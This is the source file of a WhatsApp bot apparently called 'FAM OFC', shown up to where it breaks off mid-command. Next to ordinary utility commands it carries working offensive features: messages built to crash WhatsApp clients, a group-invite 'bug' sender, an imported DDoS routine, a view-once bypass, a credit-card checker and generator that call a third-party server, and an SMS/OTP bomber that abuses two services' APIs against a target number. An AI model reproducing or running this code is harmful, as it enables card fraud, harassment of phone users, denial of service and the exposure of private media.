


//base by © sevenz/Yuri
//developer famofc
//koi bhe agr case ya function mare script sy nekaly to fam ofc ka credit zaror add kry









require("./config")
const {
generateMessageIDV2, 
generateMessageID, 
WA_DEFAULT_EPHEMERAL, 
getAggregateVotesInPollMessage,
generateWAMessageFromContent,
proto, 
generateWAMessageContent,
 generateWAMessage, 
prepareWAMessageMedia,
downloadContentFromMessage, 
areJidsSameUser,
 getContentType, 
useMultiFileAuthState,
 makeWASocket, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore,
 makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
let aiMode = false; // Default: AI Mode is OFF





module.exports = async (conn, m) => {
try {
const from = m.key.remoteJid
const info = m.message

var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, getPing, tanggal, getRandom } = require('./lib/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix

const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
const sender = m.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)

const senderNumber = sender.split('@')[0]

const pushname = m.pushName || `${senderNumber}`
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await AryaRyuigichi.getName(i),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:famofcyt@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/faheemxyz\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;Gabon;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}

const isBot = m.key.fromMe ? true : false
const os = require('os')
const time = hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const data = date = dataa = moment.tz('America/Sao_Paulo').format('DD/MM/YY')
const isGroup = m.chat.endsWith("@g.us")
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
		const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
		const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
		const Inputo = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
const pickRandom = (arr) => {return arr[Math.floor(Math.random() * arr.length)]}
const nullimg = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAAAQIDBAUGAQADAQEAAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA4lkbHA5zedJJDULIjqJCt2V63GzX0NN83kc/a5K1rWmpVnGToupytLvrYIVvr9Hz4+ifByOR6Ly6KSJNqypl3Opub9vMmdWzAVqEIWIwGwBgAIAEAT//xAAkEAACAwACAQIHAAAAAAAAAAAAAQIDEQQSEAUgExQkMTJSYf/aAAgBAQABPwBISEva0SWiERi2fCY1j8sYiK0oobSPlv4y+vpOXjNGhiOPDvNIoqhXCLZ3qz8kc2re0hwZTU5ywsj1m0MR6Yk+QjmcmztKr7JHaX7MglbxoR3WT4z7M4dGWPTlrL7BiKbJQlsXjJ2OTbb1nZnAsULU5SxEK6rF2Of9PWnWWzc5tsYiLw00iyPLvgklIu5VtkcnIkxvwmaaJnclPRv3b7f/xAAcEQEAAgIDAQAAAAAAAAAAAAABABEQIQISIDD/2gAIAQIBAT8AleAncNVElazUOQaSLbm4/D//xAAiEQEAAgEDAwUAAAAAAAAAAAABAAIDEBESBEFRFCEiMWH/2gAIAQMBAT8AWNg0IMu8ar4h02TKc26b+JjtuI9nachu17hCFOVivmeoMXwoAE6rBZvzx3+yY8F6Yi1mqrNoRJhyla8bAn7M1i9vYA0NXT//2Q=="
//sevenkrl\\
const famofc = fs.readFileSync('./famofc_v10/famofc.jpg')

const { startDDoS } = require('./famofc_v10/DDoS'); // DDoS Attack Script کو امپورٹ کریں
const { teksbug2 } = require("./famofc_v10/delay.js")

const fuckBeta = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: 'foi o yuriKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkk'
}}
}
if (aiMode && text) { 
    await getAIResponse(text, m);
}

if (m.message) {
console.log(`
╭─────────────────────────────────
│〔 OF 〕: ${sender}
│
│〔 MESSAGE 〕: ${body}
│
│〔 NAME 〕: ${pushname} 
│
│〔 TYPE 〕: ${m.mtype}
│
╰─────────────────────────────────`) 
}


const numeroFormatado = q.replace(/[^\d]/g, '');
const numi = numeroFormatado + '@s.whatsapp.net'

const enviar = (texto) => {conn.sendMessage(from, { text: texto})}

const reply = (texto) => {conn.sendMessage(from, { text: texto})}

const crashdoc = {key: {fromMe: false,participant: "0@s.whatsapp.net",remoteJid: "0@s.whatsapp.net",},message: {documentMessage: {url: "https://mmg.whatsapp.net/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0&mms3=true",mimetype: "text/plain",fileSha256: "VigI621vLq45R4KIODq41owOti/0ZXSK+aLEZOl79H8=",fileLength: "2143",pageCount: 999999999999999,mediaKey: "qStyFpDZOsxVCbR6oWfjM1AP6OKPloEYtoDVHeAEdxI=",fileName: "types.travadoc",fileEncSha256: "DOWZGa+9qihKxH1ZG0Fi0YhhSb1eZrFNM961Jlbzxdg=",directPath: "/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0",mediaKeyTimestamp: "1714550098",contactVcard: true,}},}

//crash
let push = [];
let buttt = [];
for (let i = 0; i < 1000; i++) {push.push({body: proto.Message.InteractiveMessage.Body.fromObject({text: "ㅤ"}),footer: proto.Message.InteractiveMessage.Footer.fromObject({text: "ㅤㅤ"}),header: proto.Message.InteractiveMessage.Header.fromObject({title: '\n', hasMediaAttachment: true,"imageMessage": {"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true","mimetype": "image/jpeg","fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=","fileLength": "10840","height": 10,"width": 10,"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=","fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=","directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0","mediaKeyTimestamp": "1721344123","jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",}}),nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({"buttons": [] })});}
const carousel = generateWAMessageFromContent(from, {viewOnceMessage: {message: {messageContextInfo: {deviceListMetadata: {},deviceListMetadataVersion: 2},interactiveMessage: proto.Message.InteractiveMessage.fromObject({body: proto.Message.InteractiveMessage.Body.create({text: "Exploit Beta™ Seven ;;"}),footer: proto.Message.InteractiveMessage.Footer.create({text: global.namabot}),header: proto.Message.InteractiveMessage.Header.create({hasMediaAttachment: false}),carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({cards: [...push]})})}}}, {});

async function sendFakeMessage(jides,definirText) {await conn.relayMessage(jides, {extendedTextMessage: {text: definirText},"deviceSentMessage": {"phash": ""}}, {});}

const fanofc = {
"key": { 
"fromMe": false,
"participant": '13135550002@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: '🚀 **FAM OFC BOT** – The ultimate WhatsApp automation advanced features like CC checking, AI chatbot, SMS bombing, IP tracking, and more. Developed by **Faheem**, this bot is designed for **VIP users** with a **modern UI** and **powerful utilities**. 🔥'
}}
}
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `🚀 **FAM OFC BOT** – The ultimate WhatsApp automation advanced features like CC checking, AI chatbot, SMS bombing, IP tracking, and more. Developed by **Faheem**, this bot is designed for **VIP users** with a **modern UI** and **powerful utilities**. 🔥`}}}



const qloc = {
    "key": {
        "participant": '0@s.whatsapp.net',
        "remoteJid": "status@broadcast",
        "fromMe": false,
        "id": "Halo"
    },
    "message": {
        "locationMessage": {
            "name": 'Developer famofc',
            "jpegThumbnail": null // Set a Base64 image if needed
        }
    }
};

const imagePath = './famofc_v10/famofc.jpg';  
const audioPath = './famofc_v10/Famzysound.mp3';  

// Preload image and audio buffers to avoid redundant disk reads
const imageBuffer = fs.readFileSync(imagePath);
const audioBuffer = fs.readFileSync(audioPath);

const enviar2 = (teks) => {
conn.sendMessage(from, { text : teks }, { quoted : m })
}
const ownerFile = "./database/owner.json";

// 📂 Read & Write Owner Data
const getOwners = () => {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile));
};
const saveOwners = (owners) => {
    fs.writeFileSync(ownerFile, JSON.stringify(owners, null, 2));
};

// 🔥 Check if User is Owner
const isCreator = (sender) => {
    const owners = getOwners();
    return owners.includes(sender);
};







switch(command) {

/*
case "ddos":
    if (!text.includes("|")) return m.reply("❌ *Usage:* .ddos <url>|<time>\nExample: .ddos http://example.com|60\n\n🚀 Powered by FAM OFC");

    let [targetUrl, attackTime] = text.split("|");

    if (!targetUrl.startsWith("http")) return m.reply("❌ Invalid URL! Please provide a valid website link.\n\n🔥 Powered by FAM OFC");
    if (isNaN(attackTime) || attackTime < 1) return m.reply("❌ Invalid time! Please enter time in seconds (e.g., 60).\n\n🚀 Powered by FAM OFC");

    startDDoS(targetUrl, attackTime);
    m.reply(`✅ *DDoS Attack Started!*\n\n🌍 *Target:* ${targetUrl}\n⏳ *Duration:* ${attackTime} seconds\n\n🔥 *Powered by FAM OFC*`);
    break;
    */
/*
case 'menu1':{
await conn.sendMessage(from, {react: {text: "⏳", key: m.key}}); 
const text12 = `
╭━━━╮╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━━╯╱╱╱╱╱╱╱╱╱╱┃╭╯
┃╰━━┳━━┳╮╭╮╭━━┳╯╰┳━━╮
┃╭━━┫╭╮┃╰╯┃┃╭╮┣╮╭┫╭━╯
┃┃╱╱┃╭╮┃┃┃┃┃╰╯┃┃┃┃╰━╮
╰╯╱╱╰╯╰┻┻┻╯╰━━╯╰╯╰━━╯         
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┏━━━━━━━━━━━━━━┈ 
┣──=[ *\`[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ]\`* ] 
┆ 🤖 *Bot Name:*  ${global.namaBot}
┆ 👤 *User:* ${pushname}  
┆ 😎 *Status:* ${!isCreator(m.sender) ? "User ⭐" : "Developer ⭐"}
┆ 🎊 *Premium:* ${isPremium ? "✅" : "❎"}
┆ 🛠 *Type:* Tool  
┆ 🔢 *Version:* ${global.versionBot}  
┆ 🧑‍💻 *Dev:* ${global.namaDeveloper}  
┆ 🚀 *Powered by FAM OFC*  
└━━━━━━━━━━━━━━┈ ⳹
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`

conn.sendMessage(m.chat, { 
        image: imageBuffer,  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "fam vip bot",
                    newsletterJid: `120363390114292114@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `fam vip bot v10`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://iili.io/2yFPx0F.png',
                   sourceUrl: `https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C`
                }
            }
        },{ quoted: qloc }
     )
  }
 break;
*/

case "ai-mode": {
    if (!isCreator(sender)) return m.reply("❌ Only the Owner can use this command!");
    if (text === "on") {
        aiMode = true;
        return m.reply("✅ *AI Mode Activated!* 🤖\nNow I will reply to every message.");
    } 
    if (text === "off") {
        aiMode = false;
        return m.reply("❌ *AI Mode Deactivated!* 🚫\nI will stop replying automatically.");
    }
    return m.reply("📌 *Usage:*\n.ai-mode on\n.ai-mode off");
}
break;





case "wallpaper": {
    if (args.length === 0) return m.reply("❌ *Please provide a wallpaper name!*\n\nExample: `.wallpaper naruto`");

    let query = args.join(" ");
    let apiUrl = `https://api-xx-xi.hf.space/api/wallpaper?q=${encodeURIComponent(query)}`;

    try {
        let response = await fetch(apiUrl);
        let data = await response.json();

        if (!data.success || !data.results || data.results.length === 0) {
            return m.reply(`❌ *No wallpapers found for:* ${query}`);
        }

        // Select a random wallpaper from the results
        let randomWallpaper = data.results[Math.floor(Math.random() * data.results.length)];

        // Send the wallpaper
        await conn.sendMessage(m.chat, { 
            image: { url: randomWallpaper.link }, 
            caption: `🖼️ *Wallpaper for:* ${query}\n📝 *Description:* ${randomWallpaper.description}\n\n🚀 *Powered by FAM OFC*` 
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        m.reply("❌ *Error fetching wallpaper! Please try again later.*");
    }
}
break;

// 🎯 Add Owner Case
case "addowner": {
if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    if (!args[0]) return conn.sendMessage(m.chat, { text: "📌 *برائے مہربانی ایک نمبر درج کریں!* (مثال: \n `.addowner 923001234567`)" }, { quoted: m });
    let number = text.replace(/\D/g, "") + "@s.whatsapp.net"; 
    let owners = getOwners();

    if (owners.includes(number)) {
        return conn.sendMessage(m.chat, { text: "✅ *This number is already an Owner!*" }, { quoted: m });
    }

    owners.push(number);
    saveOwners(owners);

    conn.sendMessage(m.chat, { text: `🎉 *Successfully added new Owner: ${number}*` }, { quoted: m });
  }  break;


// 🗑 Remove Owner Case
case "removeowner": {
if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    if (!args[0]) return conn.sendMessage(m.chat, { text: "📌 *برائے مہربانی ایک نمبر درج کریں!* (مثال: \n `.removeowner 923001234567`)" }, { quoted: m });
    let number = text.replace(/\D/g, "") + "@s.whatsapp.net"; 
    let owners = getOwners();

    if (!owners.includes(number)) {
        return conn.sendMessage(m.chat, { text: "❌ *This number is not an Owner!*" }, { quoted: m });
    }

    owners = owners.filter(owner => owner !== number);
    saveOwners(owners);

    conn.sendMessage(m.chat, { text: `🗑 *Successfully removed Owner: ${number}*` }, { quoted: m });
   } break;


case "crt": {
if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    if (!args[0]) return m.reply(`Usage: ${prefix + command} Link\nExample: ${prefix + command} https://chat.whatsapp.com/FuLRVI2SGNd4bnWlPsEt`);

    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let Pehssjsjsj = await conn.groupAcceptInvite(result);
    jumlah = "3";

    for (let i = 0; i < jumlah; i++) {
        var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
            "groupInviteMessage": {
                "groupJid": "120363251190676308@g.us",
                "inviteCode": "/RwWifkIpEQUesVv",
                "inviteExpiration": "1709614188",
                "groupName": `${teksbug2}`,
                "caption": "Yahaha Lag Ya?!"
            }
        }), { userJid: from, quoted: m });

        conn.relayMessage(Pehssjsjsj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id });
    }

    // Adding credit
    m.reply(`✅ Successfully sent the bug!\n\n🔹 *Credit: FAM OFC*`);
}
break;



case "b3chk": case "chkcc": case "b3": {
    if (!text) {
        return m.reply("📌 *Provide a CC in the format:*\n`4147768576029506|11|2025|153`");
    }

    try {
        // Send loading message
        let loadingMessage = await m.reply("⏳ *Checking card status... Please wait.*");

        // API request
        const response = await axios.get(`https://fam-official.serv00.net/sim/b3.php?famcc=${encodeURIComponent(text)}`);

        // Delete loading message before response
        await conn.sendMessage(m.chat, { delete: loadingMessage.key });

        if (response.data.status === "success") {
            let binInfo = response.data.bin_info;
            let ccStatus = response.data.cc_status;
            let responseMessage = response.data.response_message;

            let resultMessage = `🎩 *𝐊𝐚𝐦𝐚𝐥 X 𝐅𝐀𝐌 𝐎𝐅𝐂 \n 𝐁𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫*\n\n`;
            resultMessage += `💳 *Card:* ${response.data.card}\n`;
            resultMessage += `🌍 *Gateway:* ${response.data.gateway}\n`;
            resultMessage += `📌 *Status:* ${ccStatus}\n`;
            resultMessage += `📢 *Response:* ${responseMessage}\n\n`;
            resultMessage += `🏦 *Bank:* ${binInfo.bank}\n`;
            resultMessage += `🌍 *Country:* ${binInfo.country} ${binInfo.emoji}\n`;
            resultMessage += `💳 *Brand:* ${binInfo.brand}\n`;
            resultMessage += `🔍 *Scheme:* ${binInfo.scheme}\n`;
            resultMessage += `📌 *Type:* ${binInfo.type}\n\n`;
            resultMessage += `🚀 *Powered by kamal x fam*\n`;

            // Select image based on status
            let imgUrl = ccStatus.includes("Approved") 
                ? "https://fam-official.serv00.net/script12/fampng/approved.png" 
                : "https://fam-official.serv00.net/script12/fampng/declined.png";

            // Send image with text
            await conn.sendMessage(m.chat, { image: { url: imgUrl }, caption: resultMessage });

        } else {
            m.reply("⚠ *Failed to check card. Try again with a valid CC.*");
        }
    } catch (error) {
        console.error("API Error:", error);
        await conn.sendMessage(m.chat, { delete: loadingMessage.key });
        m.reply("⚠ *Error checking card. Try again later.*");
    }
}
break;



case "clean": {
 if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    try {
        let sessionFolder = "./session"; // Apna session folder ka path likhein
        let excludedFile = "creds.json"; // Yeh file delete nahi hogi

        // Send loading message
        let loadingMessage = await m.reply("⏳ *Cleaning session files... Please wait.*");

        const fs = require("fs");
        const path = require("path");

        if (fs.existsSync(sessionFolder)) {
            let files = fs.readdirSync(sessionFolder);
            let deletedFiles = 0;

            for (let file of files) {
                let filePath = path.join(sessionFolder, file);
                
                if (fs.lstatSync(filePath).isFile() && file !== excludedFile) {
                    fs.unlinkSync(filePath);
                    deletedFiles++;
                }
            }

            // Delete loading message before response
            await conn.sendMessage(m.chat, { delete: loadingMessage.key });

            m.reply(`✅ *Successfully deleted ${deletedFiles} session files!*\n⚠ *creds.json is kept safe.*`);
        } else {
            m.reply("❌ *Session folder not found!*");
        }
    } catch (error) {
        console.error("Error Cleaning Sessions:", error);
        m.reply("⚠ *Error cleaning session files. Try again later.*");
    }
}
break;
case "runtime": case "ping": {
    let uptime = runtime(process.uptime());
    let ping = await getPing();
    
    let response = `
┌─〔 *BOT STATUS* 〕
│⏳ *Uptime:* ${uptime}
│⚡ *Ping:* ${ping}
└───────────────
    `;
    
    m.reply(response);
}
break;
case "vv": case "readviewonce": {
    if (!m.quoted || !m.quoted.message) {
        return m.reply("⚠ *Reply to a View Once message!*");
    }

    // Debugging: Log the quoted message structure
    console.log("🔍 Debugging Quoted Message:", JSON.stringify(m.quoted, null, 2));

    let msg = m.quoted.message;
    let keys = Object.keys(msg);
    
    if (!keys.length) return m.reply("⚠ *Invalid message structure!*"); 

    let type = keys[0]; // Safely get the message type

    if (!msg[type] || !msg[type].viewOnce) {
        return m.reply("⚠ This is not a *View Once* message!");
    }

    // Send initial reaction (😈 before processing)
    await conn.sendMessage(m.chat, { react: { text: "😈", key: m.key } });

    try {
        let mediaType = type.includes('image') ? 'image' : type.includes('video') ? 'video' : 'audio';
        let media = await downloadContentFromMessage(msg[type], mediaType);
        let buffer = Buffer.from([]);

        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        if (/video/.test(type)) {
            await conn.sendMessage(m.chat, { 
                video: buffer, 
                caption: `${msg[type].caption || ""}\n\n🚀 *Powered by FAM OFC*`, 
            }, { quoted: m });
        } else if (/image/.test(type)) {
            await conn.sendMessage(m.chat, { 
                image: buffer, 
                caption: `${msg[type].caption || ""}\n\n🚀 *Developed by Faheem*`, 
            }, { quoted: m });
        } else if (/audio/.test(type)) {
            await conn.sendMessage(m.chat, { 
                audio: buffer, 
                mimetype: "audio/mpeg", 
                ptt: true 
            }, { quoted: m });
        }

        // Send success reaction (✅ after sending)
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        // Send error reaction (❌ if failed)
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        m.reply("❌ *Failed to retrieve the View Once message!*");
        console.error(error);
    }
}
break;



case "developer": {
    
    
    let response = `
┌─〔 *FAM OFC - INFO* 〕
│  
│ 🔴 *YouTube:* [@famofch4k3r]  
│ 🔵 *Telegram:* [Join Now](https://t.me/famofc)  
│ 🟢 *WhatsApp Channel:* [Click Here](https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C)  
│  
│ 🌐 *Website:* [Visit Now](https://fam-tool.vercel.app/)  
│ 📸 *Instagram:* [@fam_ofc1]  
│ 🐙 *GitHub:* [Faheemxyz]  
│ 💬 *WhatsApp:* [+923350963366]  
│  
└──────────────────

    `;
    
    m.reply(response);
}
break;

case "lunaticseven": {
    
    
    let response = `
┌─〔 *Lunatic Seven* 〕
│
│🔴 *YouTube* https://youtube.com/@cogiton3rd
│
└───────────────
    `;
    
    m.reply(response);
}
break;


case "gen": case "ccgen": case "gencc": {
    if (!text) {
        return m.reply('📌 *Provide a BIN (First 6 digits)*\nExample: `.gen 550989`');
    }

    try {
        let loadingMessage = await m.reply("⏳ *Generating cards... Please wait.*");

        const response = await axios.get(`https://fam-official.serv00.net/sim/famccgen.php?cc=${encodeURIComponent(text)}`);

        await conn.sendMessage(m.chat, { delete: loadingMessage.key });

        if (response.data.status === "success" && response.data.generated_cards.length > 0) {
            let cards = response.data.generated_cards;
            let binInfo = response.data.bin_info;
            let formattedCards = cards.join("\n");

            let pan = `🎩 *𝐅𝐀𝐌 𝐎𝐅𝐂 - 𝐂𝐂 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑*\n\n`;
            pan += `🔢 *BIN:* ${text}xxxxx\n`;
            pan += `🏦 *Bank:* ${binInfo.bank}\n`;
            pan += `🌍 *Country:* ${binInfo.country} ${binInfo.emoji}\n`;
            pan += `💳 *Brand:* ${binInfo.brand}\n`;
            pan += `🔍 *Scheme:* ${binInfo.scheme}\n`;
            pan += `📌 *Type:* ${binInfo.type}\n`;
            pan += `💰 *Currency:* ${binInfo.currency}\n\n`;
            pan += `🚀 *Powered by FAM OFC*`;

            const imgUrl = "https://fam-official.serv00.net/script12/fampng/Famccgen.png"; // Change to an image file

            let msg = generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: { text: pan },
                                carouselMessage: {
                                    cards: [
                                        {
                                            header: {
                                                imageMessage: (await generateWAMessageContent(
                                                    { image: { url: imgUrl } }, // Sends image instead of GIF
                                                    { upload: conn.waUploadToServer }
                                                )).imageMessage,
                                                hasMediaAttachment: true,
                                            },
                                            body: {
                                                text: `🔢 *Generated Cards:*\n\`\`\`${formattedCards}\`\`\``
                                            },
                                            nativeFlowMessage: {
                                                buttons: [
                                                    {
                                                        name: "cta_copy",
                                                        buttonParamsJson: `{"display_text":"📋 Copy CCs","copy_code":"${formattedCards}"}`
                                                    }
                                                ],
                                            },
                                        },
                                    ],
                                    messageVersion: 1,
                                },
                            },
                        },
                    },
                },
                {}
            );

            await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

        } else {
            m.reply("⚠ *Failed to generate cards. Try again with a valid BIN.*");
        }
    } catch (error) {
        console.error("API Error:", error);
        await conn.sendMessage(m.chat, { delete: loadingMessage.key });

        m.reply("⚠ *Error generating cards. Try again later.*");
    }
}
break;








case "smsboomer": {
 if ( !isPremium) return enviar("only used a premium user")
    if (!text) {
        return m.reply('📌 Provide a phone number and sms amount\nExample: .smsboomer 923XXX 1-100');
    }

    let args = text.split(" ");
    if (args.length !== 2) {
        return m.reply('📌 Invalid format! Use: .smsboomer <phone_number> <count>');
    }

    let phone = args[0];
    let count = parseInt(args[1]);

    if (!phone || isNaN(count) || count < 1 || count > 100) {
        return m.reply('⚠ Enter a valid phone number and OTP count (1-100).');
    }

    m.reply('⏳ Sending OTPs...');

    try {
        let requests = [];
        for (let i = 0; i < count; i++) {
            let apiUrl = i % 2 === 0 
                ? `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`
                : `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;

            let payload = i % 2 !== 0 ? JSON.stringify({
                Version: 'V1',
                Language: 'en',
                Platform: 'web',
                ProductId: 1733,
                MobileNo: phone,
                OperatorId: '100007',
                URL: 'https://www.tapmad.com/sign-up',
                source: 'organic',
                medium: 'organic'
            }) : null;

            let options = {
                method: 'POST',
                headers: i % 2 !== 0 ? {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                } : {},
                body: payload
            };

            requests.push(fetch(apiUrl, options));
        }

        await Promise.all(requests);
        m.reply('✅ OTP(s) sent successfully!');
    } catch (error) {
        console.error("API Error:", error);
